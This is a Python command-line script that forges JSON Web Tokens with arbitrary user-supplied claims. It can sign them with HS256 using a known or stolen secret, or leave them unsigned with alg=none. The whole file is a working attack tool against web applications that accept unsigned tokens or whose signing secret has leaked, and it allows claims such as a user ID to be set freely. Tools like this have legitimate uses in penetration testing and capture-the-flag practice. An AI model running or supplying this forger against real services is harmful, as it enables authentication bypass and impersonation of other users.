#!/usr/bin/env python3

import base64
import hmac
import hashlib
import json
import argparse
import sys

def base64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def forge_jwt_hs256(secret: str, claims: dict) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    header_enc = base64url_encode(json.dumps(header, separators=(',', ':')).encode())
    payload_enc = base64url_encode(json.dumps(claims, separators=(',', ':')).encode())
    message = f"{header_enc}.{payload_enc}".encode()
    sig = hmac.new(secret.encode(), message, hashlib.sha256).digest()
    sig_enc = base64url_encode(sig)
    return f"{header_enc}.{payload_enc}.{sig_enc}"

def forge_jwt_none(claims: dict) -> str:
    header = {"alg": "none", "typ": "JWT"}
    header_enc = base64url_encode(json.dumps(header, separators=(',', ':')).encode())
    payload_enc = base64url_encode(json.dumps(claims, separators=(',', ':')).encode())
    return f"{header_enc}.{payload_enc}."  # Note the trailing dot

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Forge a JWT with custom claims.")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--secret', help='Signing secret for HS256')
    group.add_argument('--none', action='store_true', help='Use alg=none (unsigned JWT)')

    parser.add_argument('--claim', action='append', help='Claim in key=value format (e.g. --claim user_id=5)', required=True)

    args = parser.parse_args()

    claims = {}
    for claim in args.claim:
        if '=' not in claim:
            sys.exit(f"❌ Invalid claim format: {claim}")
        key, value = claim.split('=', 1)
        try:
            value = int(value)
        except ValueError:
            pass
        claims[key] = value

    if args.secret:
        token = forge_jwt_hs256(args.secret, claims)
        print("🔐 JWT (HS256):", token)
    elif args.none:
        token = forge_jwt_none(claims)
        print("🔓 JWT (none):", token)
